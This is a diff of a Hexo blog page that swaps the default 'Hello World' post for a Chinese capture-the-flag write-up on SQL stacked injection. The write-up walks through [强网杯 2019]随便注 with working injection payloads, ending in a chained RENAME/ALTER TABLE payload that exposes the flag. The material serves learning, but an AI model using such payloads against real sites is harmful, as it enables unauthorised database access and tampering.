@@ -25,7 +25,7 @@
 
   
 
-  <title>Hello World | S@Kura</title>
+  <title>浅析sql-堆叠注入 | S@Kura</title>
 
   
 
@@ -48,7 +48,7 @@
 <!-- header container -->
 <header class="header-container post">
   
-    <div class="post-image" style="background-image: url(https://ts1.cn.mm.bing.net/th/id/R-C.2615bcd0ac66db7d8843e3a75fdcbe0b?rik=D6JpssrVxITSVQ&amp;riu=http%3a%2f%2fp18.qhimg.com%2fd%2f_open360%2f20140506%2f203.jpg&amp;ehk=3L4EskON97gfWOExWCIAUkYwv75Gwfo6%2fabAJ6fZjS4%3d&amp;risl=&amp;pid=ImgRaw&amp;r=0)"></div>
+    <div class="post-image" style="background-image: url(https://img.3dmgame.com/uploads/images/news/20190705/1562306781_697662.png)"></div>
   
 
   <!-- navbar -->
@@ -99,16 +99,18 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">Hello World</h1>
+          <h1 class="title-wrap">浅析sql-堆叠注入</h1>
           <h2 class="title-sub-wrap">
             <strong>S@Kura</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2022-08-13T12:45:22.318Z" itemprop="datePublished">2022-08-13</time>
+            <time  class="article-date" datetime="2022-08-14T11:33:57.000Z" itemprop="datePublished">2022-08-14</time>
           </h2>
           <ul class="wrap-list dark">
   
 </ul>
           <ul class="wrap-list dark">
+  
+    <li><a href="/tags/sql/">🏷️ sql</a></li>
   
 </ul>
         </div>
@@ -132,19 +134,48 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+        <p>前几星期写题时遇见了好几道关于堆叠注入的题目，结果发现我对堆叠注入不是特别了解，所以写一下博客记录一下，但是发现堆叠注入使用的场景和条件好像有点苛刻。</p>
+<h2 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h2><p>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询<br>原理很简单，mysql_multi_query() 支持多条sql语句同时执行，就是个;分隔，成堆的执行sql语句，例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users;show databases; </span><br></pre></td></tr></table></figure>
+<p>就同时执行以上两条命令，所以我们可以增删改查，只要权限够。<br>虽然这个注入姿势很牛逼，但实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
+<h2 id="堆叠注入触发条件"><a href="#堆叠注入触发条件" class="headerlink" title="堆叠注入触发条件"></a>堆叠注入触发条件</h2><p>堆叠注入触发的条件很苛刻，因为堆叠注入原理就是通过结束符同时执行多条sql语句，这就需要服务器在访问数据端时使用的是可同时执行多条sql语句的方法，例如php中的mysqli_multi_query函数。但与之相对应的mysqli_query()函数一次只能执行一条sql语句，所以要想目标存在堆叠注入,在目标主机没有对堆叠注入进行黑名单过滤的情况下必须存在类似于mysqli_multi_query()这样的函数,简单总结下来就是</p>
+<ul>
+<li>目标存在sql注入漏洞</li>
+<li>目标未对”;”号进行过滤</li>
+<li>目标中间层查询数据库信息时可同时执行多条sql语句</li>
+</ul>
+<h2 id="实例-强网杯-2019-随便注"><a href="#实例-强网杯-2019-随便注" class="headerlink" title="实例-[强网杯 2019]随便注"></a>实例-[强网杯 2019]随便注</h2><p><img src="https://img-blog.csdnimg.cn/cd470d5fbb2e452e82fa01837a765b8c.png"><br>输入1，页面返回正常；<br>输入1’ 页面报错了，加上注释符号#页面又回显正常，那么闭合符号就是单引号<br><img src="https://img-blog.csdnimg.cn/198039141eb946809631acd9ce4a516d.png"><br>然后进行正常的操作。</p>
+<p>判断列数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 2#   //回显正常</span><br><span class="line">1&#x27; order by 3#   //回显报错</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/5c3b00c0e66744b699e8aaaebfc811fb.png"><br>联合查询：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2#</span><br></pre></td></tr></table></figure>
+<p>发现过滤了很多函数。<br><img src="https://img-blog.csdnimg.cn/dba3672e56f949eebe79efe5cb268421.png"><br>尝试堆叠注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; show databases;#</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/cc64c4180b2a4cdc96bd5174ee9021f9.png"><br>查表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; show tables;#</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/b910c3f53cf541eab5fcf8dbec3f548f.png"><br>查询这两个表名中的列：<br></p>
+<p>注意：这里查询表名使用反单引号，在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符。<br></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;; show columns from &#x27;words&#x27;;#</span><br><span class="line">-1&#x27;; show columns from `1919810931114514`;#</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p> 在表1919810931114514中发现flag<br> <img src="https://img-blog.csdnimg.cn/8884d3fa4081450090331108b161917e.png"><br> 虽然我们已经找到了flag了，但是select被过滤了，而show命令又不能查看值。这就比较头疼了，不过如果仔细观察的话，一开始过滤的并没有alert 和 rename，我们已经知道了words是用来回显内容的，所以思路就是：我们把1919810931114514这个表更改名字为words,并增加相应的字段，使之回显原1919810931114514这个表的内容里面。</p>
+<blockquote>
+<ol>
+<li>将words的表名改成其它名字<br></li>
+<li>将1919810931114514表名改成”words”<br></li>
+<li>将flag列名改成id或者data<br></li>
+<li>在将这个新的words表插入一个列，即id或者data<br></li>
+</ol>
+</blockquote>
+<p>这里就要考验到我们对sql数据库的增删查改的能力了，当然我也不会，所以去网上搜一下。 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">rename: 修改名字</span><br><span class="line">使用方法：rename table(修改的类型) tableA(待修改的表等) to tableB(重命名后的名字)</span><br><span class="line">alter：队列进行操作</span><br><span class="line">使用方法：alter table table[表名] add column[列名] type[数据类型] //(添加列)</span><br><span class="line">		alter table table[表名] change columnA[原列名] column[修改后列名] type[数据类型] //改变列名1</span><br><span class="line">		alter table table[表名] rename columnA[原列名] column[修改后列名]  //改变列名2，(不改变数据类型)</span><br><span class="line">		alter table table[表名] alter column column[列名] type[修改后的数据类型] //修改列的数据类型</span><br><span class="line">		alter table table[表名] drop column[列名] type[数据类型]  //删除表中的某一列</span><br><span class="line">		SQL限制条件：</span><br><span class="line">        alter table table[表名] modify column[列名] int not null  //是某一列不能存储null的字段</span><br><span class="line">        alter table table[表名] modify column[列名] int null     //解除对not null的限制</span><br><span class="line">        alter table table[表名] add column[列名] primary key (id) </span><br><span class="line">        //- NOT NULL 和 UNIQUE 的结合。指定主键，确保某列（或多个列的结合）有唯一标识，每个表有且只有一个主键。</span><br><span class="line">        alter table table[表名] add unique (id);</span><br><span class="line">        //增加unique约束。保证某列的每行必须有唯一的值。(注：可以有多个 UNIQUE 约束，只能有一个 PRIMARY KEY 约束)</span><br><span class="line">        alter table table[表名] add check (限制条件); //限制列的值得范围</span><br><span class="line">        alter table table[表名] alter column[列名] set default &#x27;默认值&#x27; //设置默认值，即未给列赋值时的默认值</span><br><span class="line">		alter table table[表名] add constraint ab_c default &#x27;默认值&#x27; for column[列名] //</span><br><span class="line">		alter table table[表名] add column[列名] auto_increment    //自动赋值，默认从1开始</span><br><span class="line">		alter table table[表名] add column[列名] foreign key //保证一个表中的数据匹配另一个表中的值的参照完整性</span><br></pre></td></tr></table></figure>
+<p>构造出payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) ;show columns from words;#</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>rename table words to word1</strong>; //将words表名更改为word1</li>
+<li><strong>rename table1919810931114514to words</strong>;//将1919810931114514表名改为words</li>
+<li><strong>alter table words change flag id varchar(100)</strong>; //将words表中的flag列改成数据类型为char(100)名字为data的新列</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/95b1da7ddb7a4fe99a51228cd537c67a.png"></p>
 
       </section>
 
@@ -152,22 +183,22 @@
       
         <nav class="article-nav">
           
+          
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
     
-      <div class="card-cover" background-image-lazy data-img="https://img.3dmgame.com/uploads/images/news/20190705/1562306781_697662.png"></div>
+      <div class="card-cover" background-image-lazy data-img="https://ts1.cn.mm.bing.net/th/id/R-C.2615bcd0ac66db7d8843e3a75fdcbe0b?rik=D6JpssrVxITSVQ&amp;riu=http%3a%2f%2fp18.qhimg.com%2fd%2f_open360%2f20140506%2f203.jpg&amp;ehk=3L4EskON97gfWOExWCIAUkYwv75Gwfo6%2fabAJ6fZjS4%3d&amp;risl=&amp;pid=ImgRaw&amp;r=0"></div>
     
     <div class="card-text">
       
-        <a href="/2022/08/14/%E6%B5%85%E6%9E%90sql-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">浅析sql-堆叠注入</h2>
+        <a href="/2022/08/13/hello-world/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">Hello World</h2>
         </a>
       
-      <div class="card-text--row">Newer</div>
+      <div class="card-text--row">Older</div>
     </div>
   </article>
 </div>
-          
           
         </nav>
       
